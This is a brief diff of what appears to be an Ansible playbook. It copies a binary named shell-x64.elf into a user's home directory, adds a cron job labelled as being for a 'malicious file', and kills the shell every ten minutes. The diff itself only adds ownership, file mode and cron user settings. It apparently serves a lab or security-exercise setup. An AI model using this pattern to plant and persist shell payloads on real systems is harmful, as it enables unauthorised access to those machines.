@@ -53,6 +53,9 @@
     src: shell-x64.elf
     #Edit this (may be copy to file download)
     dest: /home/user/shell-x64.elf
+    owner: user
+    group: user
+    mode: "0644"
 
 - name: Cron job for malicious file
   cron:
@@ -67,4 +70,5 @@
    name: "kill shell"
    minute: "*/10" # every 10 minutes
    job: "pkill shell-x64.elf"
+   user: user
 ...
